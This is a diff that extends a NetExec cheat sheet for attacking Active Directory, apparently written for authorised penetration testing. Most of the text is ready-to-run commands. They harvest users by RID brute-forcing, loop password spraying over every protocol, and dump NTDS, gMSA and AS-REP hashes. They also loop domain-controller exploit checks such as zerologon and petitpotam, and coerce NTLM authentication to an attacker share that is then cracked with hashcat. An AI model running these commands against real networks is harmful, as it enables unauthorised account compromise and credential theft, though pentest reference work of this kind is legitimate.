@@ -107,7 +107,7 @@ export local_admins detailed local_admins.csv
 Single command covers users, groups, shares, and password policy via null/anonymous session:
 
 ```bash
-nxc smb <TARGET> -u '' -p '' --users --groups --shares --pass-pol
+nxc smb <TARGET> -u '' -p '' --users --groups --shares --pass-pol --rid-brute
 ```
 
 ### Password Policy Enumeration
@@ -126,10 +126,13 @@ nxc smb <TARGET> -u <USER> -p <PASS> --pass-pol
 
 #### Enumerate Users
 
+[Also check ASREPRoasting for finding users with wordlist](#asreproast)
+
 ```bash
 # Enumerate users via SMB (anonymous)
 nxc smb <DC_IP> -u '' -p '' --users
-nxc smb <DC_IP> -u '' -p '' --rid-brute
+nxc smb <DC_IP> -u '' -p '' --rid-brute 10000 > all.txt
+grep all.txt SidTypeUser | cut -d "\\" -f 2 | cut -d " " -f 1 | grep -v \\$ > users.txt
 
 # Authenticated user enumeration
 nxc smb <TARGET> -u "<USERNAME>" -p "<PASSWORD>" --users
@@ -188,13 +191,12 @@ Password spraying uses one password against many users (alternates users), which
 **Best practice**: Obtain account lockout policy beforehand (via enumeration or asking customer); if password policy is unknown, a good rule of thumb is to wait a few hours between attempts, which should be long enough for the account lockout threshold to reset.
 
 ```bash
-# Check nxc -h for services
-# Password spraying (many users vs 1 password)
-nxc smb <TARGET> -u <USERS> -p <PASSWORD> | grep '+'
-
-# Local authentication (tries local authentication instead of domain authentication)
-# Mitigated with: https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview
-nxc smb <TARGET> -u <USERS> -p <PASSWORD> --local-auth | grep '+'
+for proto in $(nxc -h 2>&1 | grep -oP '(?<=\{)[^}]+(?=\})' | head -1 | tr ',' ' '); do
+  for auth in "--local-auth" "-d <DOMAIN>"; do
+    echo "[*] $proto -- $auth" | tee -a nxc_spray_all_protos.txt
+    nxc $proto <TARGETS> -u <USER> -p '<PASSWORD>' $auth 2>/dev/null | grep '+' | tee -a nxc_spray_all_protos.txt
+  done
+done
 ```
 
 ### Pass the Hash (PtH)
@@ -278,6 +280,13 @@ Optional flags for password analysis:
 nxc smb <TARGET> -u <ADMIN_USER> -p <PASSWORD> --ntds --ntds-history --ntds-pwdLastSet
 ```
 
+#### Hash Defaults
+
+| Hash Value                             | Type   | Meaning                                                                                                                      |
+| :------------------------------------- | :----- | :--------------------------------------------------------------------------------------------------------------------------- |
+| **`aad3b435b51404eeaad3b435b51404ee`** | **LM** | **Empty / Disabled.** LM is disabled on modern Windows -- this placeholder appears for every user. Ignore it.               |
+| **`31d6cfe0d16ae931b73c59d7e0c089c0`** | **NT** | **Empty String.** The user has **no password**. Common for `Guest` or `Administrator` if not enabled/set.                   |
+
 ### Uploading and Getting Files
 
 `\\Windows\\Temp\\whoami.txt`
@@ -338,11 +347,13 @@ nxc ldap <DC_FQDN> -u <USER> -p '<PASS>' --get-sid
 
 ### gMSA Password Dump
 
+gMSA passwords are auto-rotating 240-byte machine-managed credentials stored in AD that can be retrieved as an NT hash by any principal explicitly granted `PrincipalsAllowedToRetrieveManagedPassword`.
+
 Find who can read gMSA passwords, then dump the hash:
 
 ```bash
 # Find accounts with PrincipalsAllowedToRetrieveManagedPassword
-nxc winrm <DC_FQDN> -u <USER> -p '<PASS>' -X "Get-ADServiceAccount -Filter * -Properties PrincipalsAllowedToRetrieveManagedPassword"
+nxc smb <DC_FQDN> -u <USER> -p '<PASS>' -X "Get-ADServiceAccount -Filter * -Properties PrincipalsAllowedToRetrieveManagedPassword"
 
 # Dump gMSA NTLM hash with that user
 nxc ldap <DC_FQDN> -u <GMSA_READER_USER> -p '<PASS>' --gmsa
@@ -351,6 +362,8 @@ nxc ldap <DC_FQDN> -u <GMSA_READER_USER> -p '<PASS>' --gmsa
 ### ASREPROAST
 
 When `DONT_REQ_PREAUTH` is disabled, the pre-auth (password) is not required for the DC to send a TGT for a vulnerable account.
+
+{{< embed-section page="Docs/5 - Exploitation/online-credentials-attacks" header="best-wordlists" >}}
 
 ```bash
 # WITHOUT creds -- REQUIRES user list
@@ -492,6 +505,22 @@ nxc smb <DC_IP> -u <USER> -p '<PASS>' -M nopac
 nxc smb <DC_IP> -u <USER> -p '<PASS>' -M petitpotam
 nxc smb <DC_IP> -u <USER> -p '<PASS>' -M dfscoerce
 nxc --verbose smb <DC_IP> -u <USER> -p '<PASS>' -M shadowcoerce
+
+# Loop
+
+USER="<USER>"
+PASS="<PASSWORD>"
+declare -A MODULES
+MODULES[zerologon]=""
+MODULES[ms17-010]=""
+MODULES[nopac]="-u $USER -p '$PASS'"
+MODULES[petitpotam]="-u $USER -p '$PASS'"
+MODULES[dfscoerce]="-u $USER -p '$PASS'"
+MODULES[shadowcoerce]="-u $USER -p '$PASS'"
+for module in "${!MODULES[@]}"; do
+  echo "[*] $module -- ${MODULES[$module]:-no creds}" | tee -a vuln_scan.txt
+  nxc smb <DC_IP> ${MODULES[$module]} -M $module 2>/dev/null | tee -a vuln_scan.txt
+done
 ```
 
 ## Modules
@@ -603,6 +632,21 @@ nxc smb <TARGET> -u <USER> -p '<PASSWORD>' -M keepass_trigger -o ACTION=CLEAN KE
 
 ```bash
 nxc smb <TARGET> -u <USER> -p '<PASSWORD>' -M rdp -o ACTION=enable
+```
+
+#### NTLM Coercion via Writable Share (drop-sc)
+
+NOTE: requires write access to target share + Responder listening on tun0
+
+```bash
+# Start Responder first
+sudo responder -I tun0 -wv
+
+# Drop the coercion file on the writable share
+nxc smb <DC_IP> -u <USER> -p '<PASSWORD>' -M drop-sc -o URL=\\<ATTACKER_IP>\secret FILENAME=secret
+
+# Crack captured NTLMv2 hash
+hashcat -m 5600 <HASH_FILE> /usr/share/wordlists/rockyou.txt
 ```
 
 ### LDAP
